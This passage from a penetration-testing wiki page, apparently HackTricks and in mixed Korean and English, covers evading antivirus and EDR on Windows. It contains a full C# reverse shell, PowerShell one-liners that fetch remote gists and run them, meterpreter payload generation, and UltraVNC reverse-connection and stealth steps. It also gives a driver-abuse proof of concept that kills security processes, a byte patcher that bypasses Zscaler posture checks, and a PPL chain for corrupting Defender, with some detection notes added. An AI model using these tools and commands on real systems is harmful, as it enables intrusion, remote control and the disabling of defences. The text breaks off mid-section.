- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 난독화 도구**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈소스 포크를 제공하여 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)과 변조 방지를 통해 소프트웨어 보안을 강화하는 것이다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 외부 도구를 사용하지 않고 컴파일러를 수정하지도 않은 채, 컴파일 시점에 난독화된 코드를 생성하기 위해 `C++11/14` 언어를 사용하는 방법을 보여준다.
- [**obfy**](https://github.com/fritzone/obfy): 애플리케이션을 crack하려는 사람의 일을 조금 더 어렵게 만드는, C++ template metaprogramming 프레임워크로 생성된 난독화된 연산 계층을 추가한다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 x64 binary obfuscator로, .exe, .dll, .sys를 포함한 다양한 PE 파일을 난독화할 수 있다.
- [**metame**](https://github.com/a0rtega/metame): Metame은 임의의 executable을 위한 단순한 metamorphic code engine이다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)을 사용하는 LLVM 지원 언어용 세밀한 code obfuscation 프레임워크이다. ROPfuscator는 일반 instruction을 ROP chain으로 변환해 assembly code 수준에서 프로그램을 난독화하며, 정상적인 control flow에 대한 우리의 자연스러운 인식을 방해한다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter이다
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 이를 load할 수 있다

## SmartScreen & MoTW

인터넷에서 일부 executable을 다운로드하고 실행할 때 이 화면을 본 적이 있을 것이다.

Microsoft Defender SmartScreen은 잠재적으로 악성인 application의 실행으로부터 최종 사용자를 보호하기 위한 보안 메커니즘이다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 reputation-based 접근 방식으로 동작하며, 흔하지 않게 다운로드된 application은 SmartScreen을 trigger하여 최종 사용자가 파일을 실행하지 못하도록 경고하고 차단한다(하지만 More Info -> Run anyway를 클릭하면 여전히 실행할 수 있다).

**MoTW** (Mark of The Web)는 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)으로, Zone.Identifier라는 이름을 가지며 인터넷에서 파일이 다운로드될 때 다운로드된 URL과 함께 자동으로 생성된다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드된 파일의 Zone.Identifier ADS를 확인하는 모습.</p></figcaption></figure>

> [!TIP]
> **trusted** signing certificate로 서명된 executable은 **SmartScreen을 trigger하지 않는다**는 점이 중요하다.

payload가 Mark of The Web을 받지 않게 하는 매우 효과적인 방법은 ISO 같은 container 안에 패키징하는 것이다. 이는 Mark-of-the-Web (MOTW)가 **non NTFS** 볼륨에는 적용될 **수 없기** 때문이다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 Mark-of-the-Web을 회피하기 위해 payload를 output container로 패키징하는 도구이다.

예시 사용법:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
이것은 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)를 사용해 ISO 파일 안에 payload를 넣어 SmartScreen을 우회하는 데모입니다.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 Windows에서 애플리케이션과 시스템 구성 요소가 **events를 기록**할 수 있게 해주는 강력한 로깅 메커니즘입니다. 하지만 보안 제품이 악성 활동을 모니터링하고 탐지하는 데에도 사용할 수 있습니다.

AMSI가 disabled (bypassed)되는 방식과 비슷하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수가 어떤 events도 기록하지 않고 즉시 반환하도록 만들 수도 있습니다. 이는 함수의 메모리를 패치해 즉시 반환하게 만드는 방식으로, 결과적으로 해당 프로세스의 ETW 로깅을 비활성화합니다.

더 많은 정보는 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 에서 확인할 수 있습니다.


## C# Assembly Reflection

C# binaries를 메모리에 로드하는 것은 꽤 오래전부터 알려져 있었고, AV에 걸리지 않고 post-exploitation 도구를 실행하는 데 여전히 매우 좋은 방법입니다.

payload가 disk를 건드리지 않고 직접 memory에 로드되므로, 전체 프로세스에 대해 AMSI만 패치하면 됩니다.

대부분의 C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.)는 이미 C# assemblies를 메모리에서 직접 실행하는 기능을 제공하지만, 그 방식은 여러 가지가 있습니다:

- **Fork\&Run**

이는 **새로운 sacrificial process를 생성**한 뒤, post-exploitation 악성 코드를 그 새 process에 주입하고, 악성 코드를 실행한 다음 완료되면 새 process를 종료하는 방식입니다. 이 방식은 장점과 단점이 모두 있습니다. fork and run 방식의 장점은 실행이 **우리의 Beacon implant process 밖에서** 일어난다는 점입니다. 즉, post-exploitation 작업 중 무언가 잘못되거나 탐지되더라도 **implant가 살아남을 가능성이 훨씬 더 큽니다.** 단점은 **Behavioural Detections**에 걸릴 가능성이 **더 높다**는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation 악성 코드를 **자기 자신의 process 안에** 주입하는 방식입니다. 이렇게 하면 새 process를 만들고 AV가 스캔하게 할 필요를 피할 수 있지만, payload 실행 중 문제가 생기면 crash로 인해 **beacon을 잃을 가능성이 훨씬 더 큽니다.**

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading에 대해 더 읽고 싶다면 이 글 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 과 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))를 확인하세요.

PowerShell **에서** C# Assemblies를 로드할 수도 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인하세요.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안하듯이, Attacker Controlled SMB share에 설치된 interpreter environment에 compromised machine이 접근할 수 있게 하면 다른 언어를 사용해 악성 코드를 실행할 수 있습니다.

SMB share의 Interpreter Binaries와 environment에 접근을 허용하면, compromised machine의 **memory 내에서 이 언어들로 arbitrary code를 실행**할 수 있습니다.

repo는 Defender가 여전히 scripts를 스캔하지만 Go, Java, PHP 등을 활용하면 **static signatures를 우회할 더 많은 유연성**을 얻는다고 설명합니다. 이러한 언어로 된 임의의 obfuscated 되지 않은 reverse shell scripts를 테스트했을 때 성공적인 것으로 확인되었습니다.

## TokenStomping

Token stomping은 공격자가 **access token 또는 EDR나 AV 같은 security prouct를 조작**할 수 있게 해주는 technique으로, privileges를 낮춰 프로세스는 죽지 않지만 malicious activities를 확인할 권한도 없게 만듭니다.

이를 막기 위해 Windows는 **외부 process가** security process의 tokens에 handle을 얻지 못하도록 막을 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에서 설명하듯이, 피해자 PC에 Chrome Remote Desktop을 그냥 배포한 다음 이를 사용해 시스템을 장악하고 persistence를 유지하는 것은 쉽습니다:
1. https://remotedesktop.google.com/ 에서 다운로드하고, "Set up via SSH"를 클릭한 뒤, Windows용 MSI 파일을 클릭해 MSI 파일을 다운로드합니다.
2. 피해자에서 설치 프로그램을 silent하게 실행합니다(admin 필요): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가서 next를 클릭합니다. 그러면 wizard가 authorization을 요청할 것이므로 계속하려면 Authorize 버튼을 클릭합니다.
4. 일부 조정을 거친 다음 주어진 parameter를 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI를 사용하지 않고 pin을 설정할 수 있게 해주는 pin param에 주의하세요).


## Advanced Evasion

Evasion은 매우 복잡한 주제입니다. 때로는 하나의 시스템 안에서도 여러 가지 telemetry source를 고려해야 하므로, 성숙한 환경에서 완전히 탐지되지 않는 것은 사실상 불가능합니다.

각 환경마다 고유한 강점과 약점이 있습니다.

[@ATTL4S](https://twitter.com/DaniLJ94)의 이 talk을 꼭 보길 강력히 권합니다. 더 Advanced Evasion techniques를 익히는 데 좋은 출발점이 될 것입니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

이것도 [@mariuszbit](https://twitter.com/mariuszbit)의 Evasion in Depth에 대한 또 다른 훌륭한 talk입니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용할 수 있습니다. 이 도구는 **binary의 일부를 제거해가며** **Defender가 악성으로 판단하는 부분이 무엇인지** 찾아서 사용자에게 나눠줍니다.\
또 다른 도구로는 같은 일을 하는 [**avred**](https://github.com/dobin/avred)가 있으며, 서비스는 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 공개 웹으로 제공됩니다.

### **Telnet Server**

Windows10까지는 모든 Windows에 설치할 수 있는 **Telnet server**가 함께 제공되었습니다(admin 권한으로 다음을 실행하면 됨):
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **시작**하고 지금 **실행**하려면:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet 포트 변경** (stealth) 및 firewall 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

다음에서 다운로드: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup이 아니라 bin downloads를 원함)

**HOST에서**: _**winvnc.exe**_를 실행하고 server를 설정:

- 옵션 _Disable TrayIcon_ 활성화
- _VNC Password_에 password 설정
- _View-Only Password_에 password 설정

그런 다음, binary _**winvnc.exe**_와 **새로** 생성된 파일 _**UltraVNC.ini**_를 **victim** 안으로 옮김

#### **Reverse connection**

**attacker**는 자신의 **host**에서 binary `vncviewer.exe -listen 5900`를 **실행**해야 하며, 그러면 reverse **VNC connection**을 받을 준비가 된다. 그다음 **victim**에서: winvnc daemon `winvnc.exe -run`을 시작하고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`를 실행

**WARNING:** stealth를 유지하려면 몇 가지를 하면 안 됨

- 이미 실행 중이라면 `winvnc`를 시작하지 말 것. 그렇지 않으면 [popup](https://i.imgur.com/1SROTTl.png)이 뜸. `tasklist | findstr winvnc`로 실행 중인지 확인
- 같은 directory에 `UltraVNC.ini` 없이 `winvnc`를 시작하지 말 것. 그렇지 않으면 [the config window](https://i.imgur.com/rfMQWcf.png)가 열림
- 도움말을 위해 `winvnc -h`를 실행하지 말 것. 그렇지 않으면 [popup](https://i.imgur.com/oc18wcu.png)이 뜸

### GreatSCT

다음에서 다운로드: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **lister**를 시작하고 다음과 같이 **xml payload**를 **execute**하세요:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 방어자는 프로세스를 매우 빠르게 종료할 것이다.**

### 우리만의 reverse shell 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음으로 컴파일하기:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 빌드 injector에 python을 사용하는 예제:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Other tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space에서 AV/EDR 죽이기

Storm-2603는 랜섬웨어를 배포하기 전에 endpoint protection을 비활성화하기 위해 **Antivirus Terminator**로 알려진 작은 콘솔 유틸리티를 활용했다. 이 도구는 자체의 **취약하지만 *signed* driver**를 가져와, Protected-Process-Light (PPL) AV 서비스조차 막지 못하는 특권 있는 kernel 작업을 수행하도록 악용한다.

핵심 요약
1. **Signed driver**: 디스크에 전달되는 파일은 `ServiceMouse.sys`이지만, 실제 binary는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식 서명된 driver `AToolsKrnl64.sys`다. 이 driver는 유효한 Microsoft signature를 가지고 있으므로 Driver-Signature-Enforcement (DSE)가 활성화되어 있어도 로드된다.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 driver를 **kernel service**로 등록하고, 두 번째 줄은 이를 시작해서 user land에서 `\\.\ServiceMouse`에 접근할 수 있게 한다.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID를 통해 임의의 process 종료 (Defender/EDR 서비스 kill에 사용) |
| `0x990000D0` | 디스크의 임의 파일 삭제 |
| `0x990001D0` | driver unload 및 service 제거 |

최소 C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD는 user-mode protections를 완전히 우회한다; kernel에서 실행되는 code는 *protected* processes를 열 수 있고, terminate할 수 있으며, PPL/PP, ELAM 또는 다른 hardening features와 무관하게 kernel objects를 변조할 수 있다.

Detection / Mitigation
•  Microsoft의 vulnerable-driver block list (`HVCI`, `Smart App Control`)를 활성화해 Windows가 `AToolsKrnl64.sys`를 로드하지 못하게 한다.
•  새 *kernel* services 생성 여부를 모니터링하고, driver가 world-writable directory에서 로드되거나 allow-list에 없을 때 경고한다.
•  user-mode handles가 custom device objects를 향한 뒤 의심스러운 `DeviceIoControl` 호출이 이어지는지 확인한다.

### On-Disk Binary Patching을 통한 Zscaler Client Connector Posture Checks 우회

Zscaler의 **Client Connector**는 device-posture rules를 로컬에서 적용하고, 결과를 다른 components에 전달하기 위해 Windows RPC에 의존한다. 두 가지 취약한 설계 선택 때문에 완전한 bypass가 가능하다:

1. Posture evaluation은 **완전히 client-side**에서 수행된다 (boolean이 server로 전송됨).
2. 내부 RPC endpoints는 연결한 executable이 **Zscaler에 의해 signed** 되었는지만 검증한다 (`WinVerifyTrust`를 통해).

디스크 상의 signed binary 네 개를 **patching**하면 두 메커니즘 모두 무력화될 수 있다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하므로 모든 check가 compliant |
| `ZSAService.exe` | `WinVerifyTrust`로 가는 indirect call | NOP 처리됨 ⇒ 어떤 process든(심지어 unsigned도) RPC pipes에 bind 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 대체됨 |
| `ZSATunnel.exe` | tunnel에 대한 integrity checks | 우회됨 |

최소 patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 재시작한 뒤:

* **모든** posture checks가 **green/compliant**로 표시된다.
* 서명되지 않았거나 수정된 바이너리도 named-pipe RPC 엔드포인트(예: `\\RPC Control\\ZSATrayManager_talk_to_me`)를 열 수 있다.
* 침해된 호스트는 Zscaler 정책에 의해 정의된 내부 네트워크에 제한 없이 접근할 수 있다.

이 case study는 순수한 client-side trust decisions와 단순한 signature checks가 몇 개의 byte patches만으로도 우회될 수 있음을 보여준다.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL)는 signer/level hierarchy를 강제하여 동일하거나 더 높은 보호 수준의 process만 서로를 tamper할 수 있게 한다. 공격 관점에서, PPL-enabled binary를 정상적으로 실행하고 그 arguments를 제어할 수 있다면, benign functionality(예: logging)를 AV/EDR가 사용하는 protected directories에 대한 제한된 PPL-backed write primitive로 바꿀 수 있다.

process를 PPL로 실행하게 만드는 조건
- target EXE(및 로드되는 모든 DLLs)는 PPL-capable EKU로 signed되어야 한다.
- process는 CreateProcess를 `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` flags와 함께 사용해 생성되어야 한다.
- binary의 signer와 일치하는 compatible protection level이 요청되어야 한다(예: anti-malware signers에는 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers에는 `PROTECTION_LEVEL_WINDOWS`). 잘못된 level은 creation 시 실패한다.

PP/PPL 및 LSASS protection에 대한 더 넓은 소개도 여기에서 볼 수 있다:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (target EXE에 대한 protection level을 선택하고 arguments를 전달함):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe`는 self-spawns 하고, 호출자가 지정한 경로에 log file을 쓰기 위한 parameter를 받는다.
- PPL process로 실행되면, file write는 PPL backing으로 발생한다.
- ClipUp는 spaces가 포함된 path를 파싱할 수 없으므로, 일반적으로 protected location을 가리키려면 8.3 short paths를 사용한다.

8.3 short path helpers
- short name 목록 확인: 각 parent directory에서 `dir /x`
- cmd에서 short path 유도: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) launcher(예: CreateProcessAsPPL)로 PPL-capable LOLBIN(ClipUp)을 `CREATE_PROTECTED_PROCESS`와 함께 실행한다.
2) ClipUp log-path argument를 전달해 protected AV directory(예: Defender Platform)에 file creation이 강제로 일어나게 한다. 필요하면 8.3 short names를 사용한다.
3) target binary가 평소 AV에 의해 열려 있거나 locked 상태라면(예: MsMpEng.exe), AV가 시작되기 전에 먼저 실행되도록 auto-start service를 설치해 boot 시점에 write를 예약한다. Process Monitor(boot logging)로 boot ordering을 검증한다.
4) reboot 시 PPL-backed write가 AV가 binary를 lock 하기 전에 발생하여 target file을 corrupt시키고 startup을 막는다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- You cannot control the contents ClipUp writes beyond placement; the primitive is suited to corruption rather than precise content injection.
- Requires local admin/SYSTEM to install/start a service and a reboot window.
- Timing is critical: the target must not be open; boot-time execution avoids file locks.

Detections
- Process creation of `ClipUp.exe` with unusual arguments, especially parented by non-standard launchers, around boot.
- New services configured to auto-start suspicious binaries and consistently starting before Defender/AV. Investigate service creation/modification prior to Defender startup failures.
- File integrity monitoring on Defender binaries/Platform directories; unexpected file creations/modifications by processes with protected-process flags.
- ETW/EDR telemetry: look for processes created with `CREATE_PROTECTED_PROCESS` and anomalous PPL level usage by non-AV binaries.

Mitigations
- WDAC/Code Integrity: restrict which signed binaries may run as PPL and under which parents; block ClipUp invocation outside legitimate contexts.
- Service hygiene: restrict creation/modification of auto-start services and monitor start-order manipulation.
- Ensure Defender tamper protection and early-launch protections are enabled; investigate startup errors indicating binary corruption.
- Consider disabling 8.3 short-name generation on volumes hosting security tooling if compatible with your environment (test thoroughly).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preconditions
- Local Administrator (needed to create directories/symlinks under the Platform folder)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Why it works
- Defender blocks writes in its own folders, but its platform selection trusts directory entries and picks the lexicographically highest version without validating that the target resolves to a protected/trusted path.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
